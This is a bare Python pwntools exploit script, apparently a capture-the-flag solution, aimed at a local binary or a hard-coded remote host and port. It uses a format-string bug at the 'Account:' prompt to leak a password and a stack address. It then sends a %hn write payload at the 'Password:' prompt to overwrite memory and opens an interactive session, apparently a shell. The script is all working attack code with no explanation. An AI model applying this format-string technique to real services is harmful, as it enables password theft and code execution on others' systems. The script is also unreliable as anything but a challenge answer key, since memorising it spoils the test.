#!/usr/bin/python3

from pwn import *
from ctypes import*




exe = ELF("./001_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")



context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+163
        b*write_passwd+72
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('67.223.119.69',5007)
else:
    p = process([exe.path])

GDB()

sa("Account: ", b'%7$s%7$p')
p.recvuntil("Account: ")
leak_password = p.recvuntil(b'0x',drop=True)
leak_address = int(p.recvline()[:-1],16)

info("leak password:" + str(leak_password))
info("leak addr:" + hex(leak_address))

payload = leak_password  
payload = payload.ljust(0x10)
payload += f'%{0x223b - 0x10}c%{43}$hn%{0x3b22 -0x223b}c%{41}$hn%{0x6873-0x3b22}c%{42}$hn'.encode()
payload = payload.ljust(0x38)
payload += p64(leak_address)
payload += p64(leak_address+2)
payload += p64(leak_address +4)



sla("Password: ",payload)




p.interactive()

#